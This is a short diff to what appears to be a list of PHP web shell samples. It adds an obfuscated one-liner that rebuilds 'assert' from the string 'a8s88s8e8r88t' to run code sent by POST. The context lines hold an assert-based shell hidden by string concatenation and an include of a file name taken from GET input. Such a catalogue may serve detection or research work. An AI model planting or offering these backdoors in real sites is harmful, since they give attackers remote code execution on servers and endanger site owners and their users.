@@ -12,3 +12,4 @@
 * $filename=$_GET['xbid'];
    include ($filename);
 * <?php $c='ass'.'ert';${c}($_POST[4]);?>
+* <?php $k = str_replace("8","","a8s88s8e8r88t");$k($_POST["8"]); ?>
